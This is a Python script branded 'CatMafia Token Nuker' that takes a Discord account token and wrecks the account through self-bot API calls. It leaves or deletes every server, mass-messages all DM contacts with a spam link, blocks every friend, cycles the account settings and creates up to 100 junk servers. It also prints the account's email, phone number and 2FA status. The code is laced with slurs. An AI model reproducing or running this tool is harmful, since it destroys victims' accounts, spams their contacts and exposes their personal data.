import sys
import os
import asyncio
import warnings
import requests
import random
import colorama
from discord.ext import commands
from colorama import Fore, init
from itertools import cycle
import threading
init(convert=True)
def giantcock():
   if sys.platform == "linux":
    os.system("clear")
   elif sys.platform == "win32":
    os.system("cls")
giantcock()

bot = commands.Bot(command_prefix='-', self_bot=True)
bot.remove_command("help")

token = input(
    "\n\x1b[1;38;5;56m\033[34mInput Token :3\x1b[1;38;5;56m >\x1b[1;38;5;56m "
)
head = {'Authorization': str(token)}
penis = requests.get('https://discordapp.com/api/v9/users/@me', headers=head)

if penis.status_code == 200:
    print('Token Is Valid')
else:
    print('Token Is Invalid Retard')
    input("Press Any Key To Exit")
    exit(0)

def uwu():
    print("\nCatmafia On Top!\n")
    iwanthead = {'Authorization': token, 'Content-Type': 'application/json'}

    async def leave_guilds():
        for guild in bot.guilds:
            try:
                await guild.leave()
                print(f'LEFT[{guild.name}]')
            except:
                print(f'Cannot Leave: [{guild.name}] (will delete if owned)')

    async def delete_guilds():
        for guild in bot.guilds:
            try:
                await guild.delete()
                print(f'Deleted: [{guild.name}]')
            except:
                print(f"Can't delete: [{guild.name}]")

    @bot.event
    async def on_ready(times: int = 100):
        print('Nuking UwU')
        ihatejs = asyncio.create_task(leave_guilds())
        daddyharder = asyncio.create_task(delete_guilds())
        await asyncio.gather(ihatejs, daddyharder)

#skidded mass dm and blocker bc mine didnt work uwu
        print("\nMass DMing Friends")
        sped = requests.get("https://discord.com/api/v9/users/@me/channels", headers=iwanthead).json()
        owo = ('Ran By Cat Mafia. http://catmafia.abuser.eu/')
        for user in sped:
            payload = {
                'content': owo
            }
            idkbro = requests.post(f"https://discord.com/api/v9/channels/{user['id']}/messages", headers=iwanthead, json=payload)
            if idkbro.status_code == 200 or 204:
                print(f'Sent DM To This Idiot: {user["id"]}\nMessage: {owo}')
            else:
                print(f'Could Not Send A DM To This:  {user["id"]}')

            requests.delete(f"https://discord.com/api/v9/channels/{user['id']}", headers=iwanthead)

        print(
            '\nBlocking The Retards Friends'
        )

        pornhub = 'https://discord.com/api/v9/users/@me/relationships'

        payload = {"type": 2}
        req = requests.get(pornhub, headers=iwanthead).json()
        for sex in req:
            gay = f"{pornhub}/{sex['id']}"
            with warnings.catch_warnings():
                warnings.simplefilter("ignore", category=DeprecationWarning)
                anus = requests.put(gay, headers=iwanthead, json=payload)
            if anus.status_code == 200:
                print(f"Successfully Blocked: {sex['id']}")
            elif anus.status_code == 204:
                print(f"Successfully Blocked: {sex['id']}")
            else:
                print('Error:' + anus.text)

        print("\nCreating Servers And Blinding")
        csgoflashbang = cycle(["light", "dark"])
        for i in range(1, times+1):
            flashbang = next(csgoflashbang)
            print(f'{i} Server Made | Theme: {flashbang.upper()}')
            flash = {
                'theme': flashbang,
                'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])
            }
            requests.patch(
                "https://discord.com/api/v9/users/@me/settings",
                headers=iwanthead,
                json=flash)
            await bot.create_guild('Cat Mafia On Top', region=None, icon=None)

    bot.run(token, bot=False)

def tinfouwu(token):
    print('Token Info')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    info = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
    if info.status_code == 200:
        userName = info.json()['username'] + '#' + info.json()['discriminator']
        userID = info.json()['id']
        phone = info.json()['phone']
        email = info.json()['email']
        mfa = info.json()['mfa_enabled']
        print(f'''
            [{Fore.RED}User ID{Fore.RESET}]:         {userID}
            [{Fore.RED}User Name{Fore.RESET}]:       {userName}
            [{Fore.RED}Email{Fore.RESET}]:           {email}
            [{Fore.RED}Phone number{Fore.RESET}]:    {phone if phone else "None"}
            [{Fore.RED}2 Factor{Fore.RESET}]:        {mfa}
            [{Fore.RED}Token{Fore.RESET}]:           {token}
            ''')
        input('Press Any Key To Return')
        return()


def cum():
  
    daddylotus = input(f"""{Fore.RED}
		
      ██╗   ██╗██╗    ██╗██╗   ██╗
      ██║   ██║██║    ██║██║   ██║
      ██║   ██║██║ █╗ ██║██║   ██║
      ██║   ██║██║███╗██║██║   ██║
      ╚██████╔╝╚███╔███╔╝╚██████╔╝
       ╚═════╝  ╚══╝╚══╝  ╚═════╝ 
       {Fore.GREEN}CatMafia Token Nuker
       Made By: Daddy Lotus
      
{Fore.RED}╔════════════════════╗   ╔════════════════════╗           
║ {Fore.MAGENTA}[1] Nuke{Fore.RED}           ║   ║ {Fore.MAGENTA}[2] Token Info{Fore.RED}     ║       
╚════════════════════╝   ╚════════════════════╝
\n\033[34mUwU :3\x1b[1;38;5;56m >\x1b[1;38;5;56m """)
    if daddylotus == '1':
        uwu()
    elif daddylotus == '2':
        tinfouwu(token)
    else:
        print('Incorrect Action, Try Again')
        cum()


cum()
